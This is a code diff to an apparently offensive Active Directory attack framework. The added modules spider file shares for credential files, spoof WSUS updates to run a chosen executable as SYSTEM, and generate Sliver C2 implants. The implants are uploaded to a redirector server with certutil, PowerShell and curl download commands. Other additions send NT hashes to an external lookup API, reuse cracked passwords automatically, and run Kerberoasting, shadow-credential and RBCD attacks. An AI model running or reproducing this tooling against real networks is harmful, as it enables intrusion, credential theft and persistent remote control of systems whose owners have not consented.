+            print(f'  {C0}.\\Snaffler.exe -s -o C:\\Windows\\Temp\\snaffler.log -v data{RESET}')
+            print(f'  {C0}# then: download C:\\Windows\\Temp\\snaffler.log{RESET}')
+            hr(); return
+
+        # local mode — run against shares via creds
+        # use netexec spider as fallback if no Snaffler
+        out = os.path.join(target.loot_dir,'snaffler.txt')
+        nxc = check_tool('netexec','nxc')
+
+        if not os.path.exists(win_t) and not t:
+            log(f'{ORANGE}Snaffler.exe not found — using netexec spider with sensitive file patterns{RESET}','warn')
+            if nxc and target.user and target.dc:
+                auth = ['-u',target.user]
+                if target.password: auth += ['-p',target.password]
+                elif target.hash:   auth += ['-H',target.hash]
+                # spider with juicy patterns
+                patterns = r'(password|passwd|secret|credential|apikey|api_key|token|id_rsa|\.pfx|\.p12|web\.config|appsettings|\.env|unattend|sysprep|vnc|\.kdbx|\.keytab)'
+                rc, out_lines = run_cmd_capture(
+                    [nxc,'smb',target.dc]+auth+[
+                        '--spider','C$','--pattern',patterns,'--regex'],
+                    label='nxc spider sensitive files')
+                hits = [l for l in out_lines if any(x in l.lower() for x in
+                        ['password','secret','credential','api','token','rsa','pfx','config','env','vnc','kdbx'])]
+                if hits:
+                    with open(out,'w') as f: f.write('\n'.join(hits))
+                    log(f'{GREEN}{len(hits)} sensitive file(s) found → {WHITE}{out}{RESET}','success')
+                    for h in hits[:20]: print(f'  {PINK}→{RESET} {h}')
+                    add_result('snaffler',f'{len(hits)} sensitive files')
+                else:
+                    log('No sensitive files found via spider','warn')
+            hr(); return
+
+        # run Snaffler.exe locally via wine or upload
+        auth_args = []
+        if target.user:     auth_args += ['-d',target.domain,'-u',target.user]
+        if target.password: auth_args += ['-p',target.password]
+        if target.hash:     auth_args += ['-h',target.hash]
+
+        cmd = [t or win_t, '-s', '-o', out, '-v', 'data'] + auth_args
+        run_cmd(cmd, label='Snaffler')
+
+        if os.path.exists(out) and os.path.getsize(out) > 0:
+            lines = open(out).read().splitlines()
+            log(f'{GREEN}{len(lines)} finding(s) → {WHITE}{out}{RESET}','success')
+            add_result('snaffler', f'{len(lines)} findings')
+        hr()
+
+
+# =============================================================================
+# PYWSUS — WSUS update spoofing → SYSTEM
+# =============================================================================
+class PyWSUS(Module):
+    name='pywsus'; description='pyWSUS — WSUS update spoofing, serve malicious update to machines pulling from WSUS server'; category='exploitation'
+    def run(self, target):
+        if not self.req(target): return
+        hr()
+        log(f'{C0}pyWSUS — WSUS update spoofing{RESET}','info')
+        log(f'{GREY}If target uses WSUS, spoof update → SYSTEM on any machine pulling updates{RESET}','info')
+
+        t = check_tool('pywsus','pywsus.py')
+        if not t:
+            log(f'pywsus not found — install: {C0}pip install pywsus{RESET}','error')
+            hr(); return
+
+        action = self.ask('action','check',['check','serve'])
+
+        if action == 'check':
+            # detect WSUS server via LDAP
+            nxc = check_tool('netexec','nxc')
+            if nxc and target.dc and target.user:
+                auth = ['-u',target.user]
+                if target.password: auth += ['-p',target.password]
+                elif target.hash:   auth += ['-H',target.hash]
+                log('Checking for WSUS server in AD...','info')
+                run_cmd_capture([nxc,'ldap',target.dc]+auth+[
+                    '--query','(objectClass=mswsusservers)','cn dNSHostName'],
+                    label='ldap WSUS discovery')
+            log('Also check: registry key on targets','info')
+            print(f'  {C0}reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate /v WUServer{RESET}')
+
+        elif action == 'serve':
+            lhost = self.ask('your IP (lhost)', _get_tun0() or _hivemind_redirector() or '')
+            port  = self.ask('port','8530')
+            payload = self.ask('payload path (exe to execute as SYSTEM)','')
+            if not lhost or not payload: hr(); return
+            log(f'{ORANGE}Starting WSUS spoofer on {lhost}:{port}{RESET}','warn')
+            log(f'{GREY}Point target machines to http://{lhost}:{port} as WSUS server{RESET}','info')
+            run_cmd(['python3',t,'--host',lhost,'--port',port,'--exe',payload],
+                    label='pywsus serve')
+        hr()
+
+
+# =============================================================================
 # MSSQL — enumerate and abuse SQL Server
 # =============================================================================
 class MSSQL(Module):
@@ -5050,7 +6339,8 @@ class MSSQL(Module):
                     ip = _sk.inet_ntoa(fcntl.ioctl(s.fileno(),0x8915,struct.pack('256s',b'tun0'))[20:24])
                     s.close(); return ip
                 except Exception: return ''
-            lhost = self.ask('your IP (for UNC capture)', _tun0() or '')
+            lhost = self.ask('your IP (for UNC capture)', _hivemind_redirector() or _tun0() or '');
+            if _hivemind_redirector() and lhost == _hivemind_redirector(): log(f'Using Hivemind redirector: {WHITE}{lhost}{RESET}','info')
             if not lhost: log('IP required','error'); hr(); return
             mssql_user = self.ask('mssql username', target.user or '')
             mssql_pass = self.ask('mssql password', target.password or '')
@@ -5548,28 +6838,41 @@ class Nmap(Module):
 
         log(f'{GREY}{" ".join(str(c) for c in cmd)}{RESET}','info')
         hr()
-        # run silently — only show clean summary
         import subprocess as _sp_nmap
         import time as _time_nmap
-        spinner_chars = '⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏'
+        spinner_chars = '⠋⠙⠹⠸⼼⠴⠦⠧⠇⠏'
         si = 0
         _start_nmap = _time_nmap.time()
         _open_count = 0
-        proc = _sp_nmap.Popen(cmd, stdout=_sp_nmap.PIPE, stderr=_sp_nmap.STDOUT,
+        _open_ports = []
+        proc = _sp_nmap.Popen(cmd + ['--stats-every','2s'],
+                               stdout=_sp_nmap.PIPE, stderr=_sp_nmap.STDOUT,
                                text=True, errors='replace')
+        _register_proc(proc)
         raw_lines = []
+        _pct = 0
         for line in proc.stdout:
             raw_lines.append(line.rstrip())
             if '/tcp' in line and 'open' in line:
-                _open_count += 1
+                m = re.search(r'(\d+)/tcp\s+open\s+(\S+)', line)
+                if m:
+                    _open_count += 1
+                    _open_ports.append(f'{m.group(1)}/{m.group(2)}')
+            # parse nmap stats percentage
+            pct_m = re.search(r'(\d+\.\d+)% done', line)
+            if pct_m: _pct = float(pct_m.group(1))
             _elapsed = int(_time_nmap.time() - _start_nmap)
             _mins, _secs = divmod(_elapsed, 60)
             _time_str = f'{_mins}m{_secs:02d}s' if _mins else f'{_secs}s'
             _port_str = f'  {PINK}{_open_count} open{RESET}' if _open_count else ''
-            sys.stdout.write(f'\r  {spinner_chars[si % len(spinner_chars)]} scanning {host}  {GREY}{_time_str}{RESET}{_port_str}   ')
+            _pct_str  = f'  {GREY}{_pct:.0f}%{RESET}' if _pct > 0 else ''
+            # show last 2 open ports found
+            _last_ports = f'  {C0}{", ".join(_open_ports[-2:])}{RESET}' if _open_ports else ''
+            sys.stdout.write(f'\r  {spinner_chars[si % len(spinner_chars)]} scanning {host}  {GREY}{_time_str}{RESET}{_pct_str}{_port_str}{_last_ports}   ')
             sys.stdout.flush(); si += 1
+        _unregister_proc(proc)
         proc.wait()
-        sys.stdout.write('\r' + ' '*60 + '\r')
+        sys.stdout.write('\r' + ' '*80 + '\r')
         sys.stdout.flush()
 
         # write to file
@@ -5940,6 +7243,73 @@ class HashCrack(Module):
         wl = self.ask('wordlist','/usr/share/wordlists/rockyou.txt')
         rules = self.ask('rules (blank = none)','')
         hr()
+
+        # ── Weakpass API pre-check ────────────────────────────────────────────
+        # For NT hashes (mode 1000) check weakpass.com before running hashcat
+        if mode == '1000' or mode == 1000:
+            log(f'{GREY}Checking Weakpass API for instant NTLM lookups...{RESET}','info')
+            try:
+                import urllib.request as _ur, json as _js
+                weakpass_hits = {}
+                with open(hfile, errors='ignore') as _f:
+                    raw_lines = [l.strip() for l in _f if l.strip()]
+                # extract NT hashes — format: user:rid:lm:nt::: or just hash
+                nt_hashes = {}
+                for line in raw_lines:
+                    parts = line.split(':')
+                    if len(parts) >= 4 and len(parts[3]) == 32:
+                        nt_hashes[parts[3].lower()] = parts[0]  # hash → username
+                    elif len(parts) == 1 and len(parts[0]) == 32:
+                        nt_hashes[parts[0].lower()] = parts[0]
+
+                for nt, username in list(nt_hashes.items())[:20]:  # max 20 lookups
+                    try:
+                        url = f'https://weakpass.com/api/v1/search/{nt}'
+                        req = _ur.Request(url, headers={'User-Agent':'segfault-ad'})
+                        resp = _ur.urlopen(req, timeout=5)
+                        data = _js.loads(resp.read())
+                        if data.get('found') and data.get('password'):
+                            pw = data['password']
+                            weakpass_hits[nt] = (username, pw)
+                            log(f'{GREEN}Weakpass hit: {WHITE}{username}{RESET}{GREEN}:{WHITE}{pw}{RESET}','success')
+                    except Exception:
+                        pass
+
+                if weakpass_hits:
+                    log(f'{GREEN}{len(weakpass_hits)} instant crack(s) via Weakpass API{RESET}','success')
+                    cracked_path = os.path.join(loot, 'cracked.txt')
+                    with open(cracked_path, 'a') as _cf:
+                        for nt, (user, pw) in weakpass_hits.items():
+                            _cf.write(f'{user}:{pw}\n')
+                    ws = os.path.basename(target.loot_dir)
+                    for nt, (user, pw) in weakpass_hits.items():
+                        _db_save_cred(ws, target.domain, user, pw, source='weakpass')
+                    add_result('hashcrack', f'{len(weakpass_hits)} weakpass hit(s)')
+                else:
+                    log(f'{GREY}No Weakpass hits — proceeding with hashcat{RESET}','info')
+            except Exception as _e:
+                log(f'{GREY}Weakpass API unavailable — proceeding with hashcat{RESET}','info')
+        elif mode in ('18200', 18200, '13100', 13100):
+            # For AS-REP/Kerberoast hashes check weakpass too
+            log(f'{GREY}Checking Weakpass API...{RESET}','info')
+            try:
+                import urllib.request as _ur2, json as _js2
+                with open(hfile, errors='ignore') as _f2:
+                    hash_lines = [l.strip() for l in _f2 if l.strip()]
+                for line in hash_lines[:10]:
+                    try:
+                        # extract password portion after last : for known format
+                        url = f'https://weakpass.com/api/v1/search/{line}'
+                        req = _ur2.Request(url, headers={'User-Agent':'segfault-ad'})
+                        resp = _ur2.urlopen(req, timeout=5)
+                        data = _js2.loads(resp.read())
+                        if data.get('found') and data.get('password'):
+                            log(f'{GREEN}Weakpass hit: {WHITE}{data["password"]}{RESET}','success')
+                    except Exception:
+                        pass
+            except Exception:
+                pass
+
         cmd = [hashcat,'-m',mode, hfile, wl,'--force','--status','--status-timer=10']
         if rules: cmd += ['-r', rules]
         log(f'{C0}hashcat -m {mode}{RESET} — cracking...','info')
@@ -5957,6 +7327,13 @@ class HashCrack(Module):
                 log(f'{GREEN}{len(cracked)} password(s) cracked:{RESET}','success')
                 for c in cracked: print(f'  {GREEN}{c}{RESET}')
                 add_result('hashcrack', f'{len(cracked)} pwd cracked')
+                # auto cred reuse for new credentials
+                try:
+                    for line in cracked[:3]:  # max 3 to avoid flooding
+                        m = re.search(r'\\?([^:$\s]+):([^:$\s]{4,})$', line)
+                        if m and not m.group(2).startswith('aad3b435'):
+                            _auto_cred_reuse(target, m.group(1), new_pass=m.group(2))
+                except Exception: pass
                 with open(os.path.join(loot,'cracked.txt'),'a') as _f:
                     _f.write('\n'.join(cracked)+'\n')
                 # save to DB
@@ -6338,6 +7715,80 @@ class BackupAbuse(Module):
 
 
 # =============================================================================
+# SLIVER — generate implant via Sliver C2 + upload to Hivemind tool server
+# =============================================================================
+class SliverModule(Module):
+    name='sliver'; description='Sliver C2 — generate implant, upload to Hivemind tool server, get download cmd'; category='exploitation'
+    def run(self, target):
+        hr()
+        log(f'{C0}Sliver C2 implant generator{RESET}','info')
+
+        # check hivemind state
+        hm       = _load_hivemind_state()
+        redirector = hm.get('redirector','')
+        toolserver = hm.get('toolserver','')
+        tools_port = hm.get('tools_port','443')
+
+        if not redirector:
+            log(f'{ORANGE}Hivemind not configured — using tun0 as lhost{RESET}','warn')
+            lhost = _get_tun0() or self.ask('lhost IP','')
+        else:
+            lhost = redirector
+            log(f'Using Hivemind redirector: {WHITE}{lhost}{RESET}','info')
+
+        lport  = self.ask('lport','8888')
+        os_    = self.ask('OS','windows',['windows','linux','macos'])
+        arch   = self.ask('arch','amd64',['amd64','386','arm64'])
+        fmt    = self.ask('format','exe',['exe','shared','shellcode'])
+        symbols = self.ask('symbol obfuscation (slow on Pi)','n',['y','n'])
+        skip   = '--skip-symbols' if symbols == 'n' else ''
+
+        # build sliver-client generate command
+        ext_map = {'exe':'.exe','shared':'.dll','shellcode':'.bin'}
+        ext = ext_map.get(fmt,'.exe')
+
+        save_dir = os.path.expanduser('~/.segfault-ad/loot/payloads')
+        os.makedirs(save_dir, exist_ok=True)
+
+        sliver_cmd = f'generate --os {os_} --arch {arch} --mtls {lhost}:{lport} --format {fmt} --save {save_dir}/ {skip}'
+
+        log(f'{GREY}Run in sliver-client:{RESET}','info')
+        log(f'  {C0}{sliver_cmd}{RESET}','info')
+        hr()
+
+        ans = self.ask('open sliver-client now','y',['y','n'])
+        if ans == 'y':
+            # check for existing implant files
+            before = set(os.listdir(save_dir))
+            subprocess.run(['sliver-client'], cwd=save_dir)
+            after  = set(os.listdir(save_dir))
+            new    = after - before
+            if new:
+                fname = sorted(new)[-1]
+                fpath = os.path.join(save_dir, fname)
+                log(f'{GREEN}Implant generated: {WHITE}{fname}{RESET}','success')
+
+                # upload to tool server if configured
+                if toolserver:
+                    url = hivemind_upload(fpath)
+                    if url:
+                        log(f'\n{C0}Download commands:{RESET}','info')
+                        log(f'  {GREY}Windows (certutil):{RESET}','info')
+                        print(f'    {C0}certutil -urlcache -split -f {url} C:\\Windows\\Temp\\{fname}{RESET}')
+                        log(f'  {GREY}Windows (powershell):{RESET}','info')
+                        print(f'    {C0}iwr {url} -o C:\\Windows\\Temp\\{fname}{RESET}')
+                        log(f'  {GREY}Linux:{RESET}','info')
+                        print(f'    {C0}curl -k {url} -o /tmp/{fname}{RESET}')
+                        add_result('sliver', f'implant → {lhost}:{lport}')
+                else:
+                    log(f'Implant saved to: {WHITE}{fpath}{RESET}','success')
+                    log(f'Upload manually or configure Hivemind tool server','info')
+            else:
+                log('No new implant found — generate one inside sliver-client','warn')
+        hr()
+
+
+# =============================================================================
 # GODPOTATO — SeImpersonatePrivilege → SYSTEM via GodPotato
 # =============================================================================
 class GodPotato(Module):
@@ -6357,7 +7808,8 @@ class GodPotato(Module):
             domain = self.ask('domain', target.domain or '')
             cmd = f'cmd /c net localgroup administrators {domain}\\{user} /add'
         elif action == 'revshell':
-            lhost = self.ask('LHOST (your IP)')
+            lhost = self.ask('LHOST (your IP)', _hivemind_redirector() or _get_tun0() or '');
+            if _hivemind_redirector() and lhost == _hivemind_redirector(): log(f'Using Hivemind redirector: {WHITE}{lhost}{RESET}','info')
             lport = self.ask('LPORT','4444')
             cmd = f'cmd /c powershell -e JABjAGwAaQBlAG4AdA...' # base64 rev shell placeholder
             log(f'Generate base64 payload with: {WHITE}msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f ps1{RESET}','info')
@@ -6718,7 +8170,15 @@ class NXCModules(Module):
             if target.hash:       _auth += ['-H',target.hash]
             elif target.password: _auth += ['-p',target.password]
         else:
-            _auth = ['-u','guest','-p','']
+            # try null session first
+            _null_test = run_cmd_capture([nxc,'smb',t_host,'-u','','-p','','--shares'],
+                                         label='null session test')[1]
+            if any('ACCESS_DENIED' in l or 'SESSION_DELETED' in l or 'ACCOUNT_DISABLED' in l
+                   for l in _null_test):
+                log(f'{ORANGE}Null session denied — trying guest{RESET}','warn')
+                _auth = ['-u','guest','-p','']
+            else:
+                _auth = ['-u','','-p','']
         nxc_smb  = [nxc,'smb', t_host]+_auth
         nxc_ldap = [nxc,'ldap',t_host]+_auth
         nxc_wmi  = [nxc,'wmi', t_host]+_auth
@@ -7385,7 +8845,8 @@ class ZipSlip(Module):
             if not msfv:
                 log('msfvenom not found — install metasploit-framework','error'); hr(); return
 
-            lhost = self.ask('your tun0/listener IP')
+            lhost = self.ask('your tun0/listener IP', _hivemind_redirector() or _get_tun0() or '');
+            if _hivemind_redirector() and lhost == _hivemind_redirector(): log(f'Using Hivemind redirector: {WHITE}{lhost}{RESET}','info')
             lport = self.ask('listener port','4444')
             arch  = self.ask('arch','x64',['x64','x86'])
             dll_name = self.ask('DLL filename (must match what app loads)','hostfxr.dll')
@@ -8092,40 +9553,67 @@ class FTP(Module):
 
 
 class Cleanup(Module):
-    name='cleanup'; description='undo destructive actions from this session — DACL/group/user changes'; category='misc'
+    name='cleanup'; description='undo destructive actions from this session — DACL/group/user/computer changes'; category='misc'
     def run(self, target):
         hr()
         print(f'  {C0}{BOLD}cleanup{RESET}  {GREY}session action log — reverse order{RESET}\n')
         if not _CLEANUP_STACK:
             log('Nothing to clean up this session','info')
+            log(f'{GREY}Tracked actions: dacl, owner, group_member, user_created, computer_created, password_reset, spn{RESET}','info')
             hr(); return
 
         # display the stack
         icons = {
-            'dacl':           f'{ORANGE}dacl  {RESET}',
-            'owner':          f'{ORANGE}owner {RESET}',
-            'group_member':   f'{C0}group {RESET}',
-            'user_created':   f'{RED}user  {RESET}',
-            'password_reset': f'{GREY}pwd   {RESET}',
-            'upn':            f'{GREY}upn   {RESET}',
+            'dacl':             f'{RED}dacl     {RESET}',
+            'owner':            f'{ORANGE}owner    {RESET}',
+            'group_member':     f'{C0}group    {RESET}',
+            'user_created':     f'{RED}user     {RESET}',
+            'computer_created': f'{RED}computer {RESET}',
+            'password_reset':   f'{GREY}pwd      {RESET}',
+            'upn':              f'{GREY}upn      {RESET}',
+            'spn':              f'{GREY}spn      {RESET}',
+            'rbcd':             f'{ORANGE}rbcd     {RESET}',
+            'shadow_cred':      f'{ORANGE}shadow   {RESET}',
         }
+        print(f'  {"#":<4}{"type":<12}{"action"}{RESET}')
+        print(f'  {"─"*60}')
         for i, entry in enumerate(reversed(_CLEANUP_STACK), 1):
-            icon = icons.get(entry['type'], f'{GREY}misc  {RESET}')
-            print(f'  {GREY}{i}.{RESET}  {icon}  {WHITE}{entry["desc"]}{RESET}')
+            icon = icons.get(entry['type'], f'{GREY}misc     {RESET}')
+            can_auto = '✓ auto' if callable(entry.get('undo')) else '⚠ manual'
+            col = GREEN if can_auto == '✓ auto' else ORANGE
+            print(f'  {GREY}{i:<4}{RESET}{icon}  {WHITE}{entry["desc"]}{RESET}  {col}{can_auto}{RESET}')
         print()
 
-        action = self.ask('action', 'all', ['all', 'select', 'list', 'clear'])
+        auto_count   = sum(1 for e in _CLEANUP_STACK if callable(e.get('undo')))
+        manual_count = len(_CLEANUP_STACK) - auto_count
+        log(f'{auto_count} auto-reversible · {manual_count} manual review needed','info')
+        print()
+
+        action = self.ask('action', 'all', ['all', 'auto', 'select', 'list', 'export', 'clear'])
+
         if action == 'list':
             hr(); return
+
         if action == 'clear':
             _CLEANUP_STACK.clear()
             log('Cleanup stack cleared','success'); hr(); return
 
+        if action == 'export':
+            import json as _j
+            out = os.path.join(target.loot_dir,'cleanup_log.json')
+            data = [{'type':e['type'],'desc':e['desc'],'auto':callable(e.get('undo'))}
+                    for e in _CLEANUP_STACK]
+            with open(out,'w') as f: _j.dump(data,f,indent=2,default=str)
+            log(f'Cleanup log → {WHITE}{out}{RESET}','success'); hr(); return
+
         to_undo = []
         if action == 'all':
             to_undo = list(reversed(_CLEANUP_STACK))
+        elif action == 'auto':
+            to_undo = [e for e in reversed(_CLEANUP_STACK) if callable(e.get('undo'))]
+            log(f'Auto-reversing {len(to_undo)} action(s)','info')
         elif action == 'select':
-            idx = self.ask('entry number(s) to undo (comma separated)')
+            idx = self.ask('entry number(s) (comma-separated)','')
             try:
                 nums = [int(x.strip()) for x in idx.split(',')]
                 rev  = list(reversed(_CLEANUP_STACK))
@@ -8136,7 +9624,7 @@ class Cleanup(Module):
         if not to_undo:
             log('Nothing selected','warn'); hr(); return
 
-        confirm = self.ask(f'Undo {len(to_undo)} action(s)?', 'y', ['y','n'])
+        confirm = self.ask(f'Undo {len(to_undo)} action(s)?','y',['y','n'])
         if confirm != 'y':
             log('Cancelled','warn'); hr(); return
 
@@ -8144,22 +9632,50 @@ class Cleanup(Module):
         failed = []
         for entry in to_undo:
             log(f'Undoing: {WHITE}{entry["desc"]}{RESET}','info')
-            if entry['type'] == 'password_reset':
-                # can't auto-undo password resets — just warn
-                entry['undo']()
-            else:
-                try:
-                    entry['undo']()
+            undo_fn = entry.get('undo')
+            if not callable(undo_fn):
+                log(f'{ORANGE}Manual cleanup required for {entry["type"]}{RESET}','warn')
+                _print_manual_cleanup(entry, target)
+                continue
+            try:
+                undo_fn()
+                if entry in _CLEANUP_STACK:
                     _CLEANUP_STACK.remove(entry)
-                except Exception as e:
-                    log(f'Failed: {e}','error')
-                    failed.append(entry)
+                log(f'{GREEN}✓ reversed{RESET}','success')
+            except Exception as ex:
+                log(f'Failed: {ex}','error')
+                failed.append(entry)
 
         if failed:
-            log(f'{len(failed)} action(s) could not be undone — review manually','warn')
+            log(f'{len(failed)} action(s) could not be auto-reversed — manual steps:','warn')
+            for e in failed:
+                _print_manual_cleanup(e, target)
         else:
-            log('Cleanup complete','success')
+            log(f'{GREEN}Cleanup complete ✓{RESET}','success')
         hr()
+
+
+def _print_manual_cleanup(entry, target):
+    """Print manual cleanup instructions for non-auto-reversible actions."""
+    t = entry.get('type','')
+    d = entry.get('desc','')
+    auth = f'-d {target.domain} -u {target.user} -p {target.password or "<pass>"}' if target.user else ''
+    if t == 'password_reset':
+        print(f'  {ORANGE}→ Manual:{RESET} reset password back for {WHITE}{d}{RESET}')
+        print(f'    {GREY}net rpc password <user> <oldpass> {auth} -S {target.dc}{RESET}')
+    elif t == 'dacl':
+        print(f'  {ORANGE}→ Manual:{RESET} restore DACL: {WHITE}{d}{RESET}')
+        print(f'    {GREY}dacledit.py -action restore -file dacledit-*.bak {auth} -dc-ip {target.dc} {target.domain}/{RESET}')
+    elif t == 'group_member':
+        print(f'  {ORANGE}→ Manual:{RESET} remove from group: {WHITE}{d}{RESET}')
+        print(f'    {GREY}bloodyad {auth} --host {target.dc} remove groupMember <group> <user>{RESET}')
+    elif t in ('user_created','computer_created'):
+        print(f'  {ORANGE}→ Manual:{RESET} delete object: {WHITE}{d}{RESET}')
+        print(f'    {GREY}bloodyad {auth} --host {target.dc} remove object <name>{RESET}')
+    else:
+        print(f'  {ORANGE}→ Manual review required:{RESET} {WHITE}{d}{RESET}')
+
+
 
 
 class DPloot(Module):
@@ -8871,6 +10387,212 @@ class LAPSToolkit(Module):
 # =============================================================================
 
 # =============================================================================
+# SMBCLIENT-NG — fast interactive SMB shell with ACL, tree, cat, mount
+# =============================================================================
+class SMBClientNG(Module):
+    name='smbclientng'; description='smbclient-ng — fast interactive SMB shell: tree, cat, acls, mount, sizeof, PTH/Kerberos'; category='lateral'
+    def run(self, target):
+        if not self.req(target): return
+        t = self.need('smbclientng','smbclient-ng')
+        if not t: return
+        hr()
+        log(f'{C0}smbclient-ng — interactive SMB shell{RESET}','info')
+        log(f'{GREY}Commands: ls, cd, get, put, cat, tree, acls, sizeof, mount, shares{RESET}','info')
+
+        host   = self.ask('target host', target.dc_fqdn or target.dc)
+        action = self.ask('mode','interactive',['interactive','command','shares','spider'])
+
+        # build auth args
+        auth = []
+        ccache = os.environ.get('KRB5CCNAME','')
+        use_krb = bool(ccache and os.path.exists(ccache) and target.user)
+
+        if use_krb:
+            auth = ['-k','--kdcHost',target.dc]
+            log(f'{GREEN}Kerberos auth — ccache{RESET}','info')
+        else:
+            if target.domain: auth += ['-d',target.domain]
+            if target.user:   auth += ['-u',target.user]
+            if target.password: auth += ['-p',target.password]
+            elif target.hash:   auth += ['--hashes',target.hash]
+
+        base_cmd = [t,'-H',host] + auth
+
+        if action == 'interactive':
+            log(f'{GREEN}Opening interactive shell...{RESET}','success')
+            log(f'{GREY}Tip: use <share> to connect, tree to list recursively, cat to read files{RESET}','info')
+            hr()
+            subprocess.call(base_cmd)
+
+        elif action == 'command':
+            cmd_str = self.ask('command to run (e.g. "ls C$")','')
+            if not cmd_str: hr(); return
+            out_dir = os.path.join(target.loot_dir,'smbclientng')
+            os.makedirs(out_dir, exist_ok=True)
+            run_cmd(base_cmd + ['-C',cmd_str], label=f'smbclient-ng: {cmd_str}')
+
+        elif action == 'shares':
+            log('Listing shares...','info')
+            run_cmd(base_cmd + ['-C','shares'], label='smbclient-ng shares')
+
+        elif action == 'spider':
+            share = self.ask('share to spider','C$')
+            depth = self.ask('max depth','3')
+            out   = os.path.join(target.loot_dir,'smbclientng',f'{share}_tree.txt')
+            os.makedirs(os.path.dirname(out), exist_ok=True)
+            log(f'Spidering {WHITE}{share}{RESET} (depth {depth})...','info')
+            rc, lines = run_cmd_capture(
+                base_cmd + ['-C',f'use {share};tree'],
+                label=f'smbclient-ng tree {share}')
+            if lines:
+                with open(out,'w') as f: f.write('\n'.join(lines))
+                log(f'{GREEN}Tree saved → {WHITE}{out}{RESET}','success')
+                # highlight interesting files
+                interesting = [l for l in lines if any(x in l.lower() for x in
+                    ['.ps1','.bat','.xml','.config','.ini','.kdbx','.pfx','.key',
+                     'password','secret','credential','backup','.xlsx','.doc'])]
+                if interesting:
+                    log(f'{PINK}{len(interesting)} interesting file(s) found{RESET}','success')
+                    for l in interesting[:20]: print(f'  {PINK}→{RESET} {l}')
+                    add_result('smbclientng', f'{len(interesting)} interesting files in {share}')
+        hr()
+
+
+# =============================================================================
+# POWERVIEW.PY — Python PowerView: full AD recon, ACL queries, attack primitives
+# =============================================================================
+class PowerViewPy(Module):
+    name='powerview'; description='powerview.py — full PowerView AD recon: Get-DomainUser/Group/ACL/GPO, Invoke-Kerberoast, shadow creds, RBCD, vuln detection'; category='recon'
+    def run(self, target):
+        if not self.req(target): return
+        t = self.need('powerview','powerview.py')
+        if not t: return
+        hr()
+        log(f'{C0}powerview.py — PowerView on steroids{RESET}','info')
+
+        action = self.ask('action','interactive',
+            ['interactive','users','groups','acl','spns','asrep','trusts',
+             'computers','gpo','ca','shadow','rbcd','vuln','recon'])
+
+        # build connection string
+        ccache = os.environ.get('KRB5CCNAME','')
+        use_krb = bool(ccache and os.path.exists(ccache))
+
+        if use_krb:
+            conn_str = f'{target.dc}'
+            auth_args = ['-k']
+        elif target.hash:
+            conn_str = f'{target.domain}/{target.user}@{target.dc}'
+            auth_args = ['--hashes',target.hash]
+        elif target.password:
+            conn_str = f'{target.domain}/{target.user}:{target.password}@{target.dc}'
+            auth_args = []
+        else:
+            conn_str = f'{target.dc}'
+            auth_args = []
+
+        base = [t, conn_str] + auth_args
+        out_dir = os.path.join(target.loot_dir,'powerview')
+        os.makedirs(out_dir, exist_ok=True)
+
+        hr()
+
+        if action == 'interactive':
+            log(f'{GREEN}Opening interactive powerview shell...{RESET}','success')
+            log(f'{GREY}Key commands: Get-DomainUser, Get-DomainGroup, Get-DomainObjectAcl{RESET}','info')
+            log(f'{GREY}             Invoke-Kerberoast, Get-DomainCA, Set-ShadowCredential{RESET}','info')
+            log(f'{GREY}             Get-DomainGPO, Get-DomainTrust, Find-LocalAdminAccess{RESET}','info')
+            hr()
+            subprocess.call(base)
+
+        elif action == 'users':
+            out = os.path.join(out_dir,'users.txt')
+            rc, lines = run_cmd_capture(
+                base + ['-C','Get-DomainUser -Properties samaccountname,description,memberof,adminCount -OutFile '+out],
+                label='powerview Get-DomainUser')
+            # parse passwords in descriptions
+            _scan_descriptions(lines, target.loot_dir, target.domain or '')
+
+        elif action == 'groups':
+            run_cmd(base + ['-C','Get-DomainGroup -Properties name,member,description'],
+                    label='powerview Get-DomainGroup')
+
+        elif action == 'acl':
+            identity = self.ask('identity (user/group to check ACLs for)', target.user or '')
+            if not identity: hr(); return
+            out = os.path.join(out_dir,'acl.txt')
+            run_cmd(base + ['-C',f'Get-DomainObjectAcl -Identity {identity} -ResolveGUIDs -OutFile {out}'],
+                    label=f'powerview ACL for {identity}')
+
+        elif action == 'spns':
+            out = os.path.join(out_dir,'kerberoast.txt')
+            rc, lines = run_cmd_capture(
+                base + ['-C',f'Invoke-Kerberoast -OutputFormat Hashcat -OutFile {out}'],
+                label='powerview Invoke-Kerberoast')
+            if lines and any('$krb5tgs$' in l for l in lines):
+                log(f'{GREEN}TGS hashes saved → {WHITE}{out}{RESET}','success')
+                add_result('powerview','kerberoast hashes captured')
+
+        elif action == 'asrep':
+            out = os.path.join(out_dir,'asrep.txt')
+            run_cmd(base + ['-C',f'Invoke-ASREPRoast -OutputFormat Hashcat -OutFile {out}'],
+                    label='powerview Invoke-ASREPRoast')
+
+        elif action == 'trusts':
+            run_cmd(base + ['-C','Get-DomainTrustMapping'],
+                    label='powerview Get-DomainTrustMapping')
+
+        elif action == 'computers':
+            run_cmd(base + ['-C','Get-DomainComputer -Properties dnshostname,operatingsystem,lastlogon'],
+                    label='powerview Get-DomainComputer')
+
+        elif action == 'gpo':
+            run_cmd(base + ['-C','Get-DomainGPO'],
+                    label='powerview Get-DomainGPO')
+
+        elif action == 'ca':
+            log('Enumerating Certificate Authorities and vulnerable templates...','info')
+            run_cmd(base + ['-C','Get-DomainCA'],
+                    label='powerview Get-DomainCA')
+            run_cmd(base + ['-C','Get-DomainCATemplate -Vulnerable'],
+                    label='powerview Get-DomainCATemplate -Vulnerable')
+
+        elif action == 'shadow':
+            identity = self.ask('target user/computer','')
+            if not identity: hr(); return
+            run_cmd(base + ['-C',f'Set-ShadowCredential -Identity {identity}'],
+                    label=f'powerview Set-ShadowCredential {identity}')
+            add_result('powerview',f'shadow cred set on {identity}')
+            track_cleanup('shadow_cred', f'shadow credential on {identity}',
+                lambda: run_cmd(base+['-C',f'Remove-ShadowCredential -Identity {identity}']))
+
+        elif action == 'rbcd':
+            target_comp = self.ask('target computer','')
+            delegate_to = self.ask('computer to delegate from (attacker-controlled)','')
+            if not target_comp or not delegate_to: hr(); return
+            run_cmd(base + ['-C',f'Set-RBCD -Identity {target_comp} -DelegateFrom {delegate_to}'],
+                    label=f'powerview Set-RBCD')
+            add_result('powerview',f'RBCD: {delegate_to} → {target_comp}')
+
+        elif action == 'vuln':
+            log('Running integrated vulnerability scan...','info')
+            run_cmd(base + ['-C','Get-Domain'],
+                    label='powerview domain vuln check')
